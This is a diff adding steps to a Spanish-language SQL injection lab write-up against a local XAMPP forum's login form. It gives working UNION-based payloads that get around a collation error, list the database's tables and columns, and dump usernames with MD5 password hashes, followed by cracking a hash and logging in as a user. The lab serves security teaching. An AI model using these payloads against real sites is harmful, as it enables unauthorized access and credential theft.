@@ -64,3 +64,85 @@ Inyección →
 
 Número de columnas de la tabla que se usa en el formulario de login: 9 columnas.
 
+
+## Primer intento de ataque
+Ahora que sabemos el número de columnas que usa la tabla del formulario del login, vamos a hacer una consulta para que nos de las tablas de la BD. Seguimos trabajando con el formulario de login:
+
+Inyección →
+```
+999' UNION select null, information_Schema.tables.table_schema, null, null, null, null, null, null, null FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name;#
+```
+
+Ahora vemos que hay un problema ya que la tabla que se usa en el login usa el collation utf16_bin y que la tabla a la que estamos intentando unir usa el collation utf8_general_cli.
+```
+Notice: Use of undefined constant forum - assumed 'forum' in C:\xampp\htdocs\foro\libraries\User.php on line 9
+
+Fatal error: Uncaught PDOException: SQLSTATE[HY000]: General error: 1267 Illegal mix of collations (utf16_bin,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION' in C:\xampp\htdocs\foro\libraries\Database.php:56 Stack trace: #0 C:\xampp\htdocs\foro\libraries\Database.php(56): PDOStatement->execute() #1 C:\xampp\htdocs\foro\libraries\Database.php(65): Database->execute() #2 C:\xampp\htdocs\foro\libraries\User.php(69): Database->single() #3 C:\xampp\htdocs\foro\login.php(11): User->login('999' UNION sele...', '5a105e8b9d40e13...') #4 {main} thrown in C:\xampp\htdocs\foro\libraries\Database.php on line 56
+```
+![](capturas/sql-injection-lab2-4.png)
+
+
+## Solución a la mezcla de collation
+En el punto anterior hemos obtenido que la inyección da un error de mezcla de collation. Para solventar esto, hacemos un cast (conversión) con el collation de la columna que solicitamos → Le hacemos un cast a utf8_general_ci de la columna information_Schema.tables.table_schema:
+
+Inyección →
+```
+999' UNION select null, information_Schema.tables.table_schema COLLATE utf8_general_ci, null, null, null, null, null, null, null FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name;#
+```
+
+![](capturas/sql-injection-lab2-5.png)
+Al poner esta consulta, vemos que ya no nos da error de la mezcla de collate. Hemos accedido a la página web superando el problema de mezcla de collation:
+
+
+Hacemos logout y ahora montamos una consulta con GROUP_CONCAT para que nos de toda la información de la BD: 
+Inyección →
+```
+999' UNION select null, GROUP_CONCAT(information_Schema.tables.table_schema, '-' ,information_Schema.columns.table_name) COLLATE utf8_general_ci, null, null, null, null, null, null, null FROM information_Schema.columns, information_Schema.tables WHERE information_Schema.tables.table_name = information_Schema.columns.table_name;#
+```
+![](capturas/sql-injection-lab2-6.png)
+
+Como no cabe todo el resultado de la consulta, también podemos hacer uso de las herramientas de desarrollador de chrome para verlo más resultados si queremos:
+![](capturas/sql-injection-lab2-7.png)
+
+Ya hemos conseguido realizar un ataque en el que podemos usar como base nuestra consulta del primer punto para saber lo que queramos de la Base de Datos. Vemos que existe una tabla users que la usaremos para más adelante buscar los nombre de usuarios y sus contraseñas.
+
+
+## Información sobre las columnas de la BD
+
+Vamos a probar la base de consulta de inyección que tenemos para ver la información de las columnas de la BD:
+Inyección →
+```
+999' UNION select null, GROUP_CONCAT(table_name,': ', column_name) COLLATE utf8_general_ci, null, null, null, null, null, null, null FROM information_Schema.columns;#
+```
+![](capturas/sql-injection-lab2-8.png)
+
+Ahora sabemos que la tabla users tiene 9 columnas que son:
+- id
+- name
+- email
+- avatar
+- username
+- password
+- about
+- last_activity
+- join_date
+
+## Ver todos los usuarios de la tabla users
+Conociendo que la tabla que contiene los usuarios se llama users y que tiene 9 columnas, montamos una consulta para que nos de todos los usuario y sus contraseñas:
+
+Consulta SQL →
+```
+SELECT * FROM users WHERE username= '999' UNION SELECT null, GROUP_CONCAT( name,': ',password,' —-- '), null, null, null, null, null, null, null  from users ORDER by name # lo que sea
+```
+
+Inyección →
+```
+999' UNION SELECT null, GROUP_CONCAT( name,': ',password,' — '), null, null, null, null, null, null, null  from users ORDER by name # lo que sea
+```
+![](capturas/sql-injection-lab2-9.png)
+
+Usando una web que muestra hashes en md5 (https://hashes.com/) obtenemos la password:
+
+
+Probamos a entrar con el usuario test2 y la contraseña que nos devolvió la web 12121980:
+![](capturas/sql-injection-lab2-10.png)
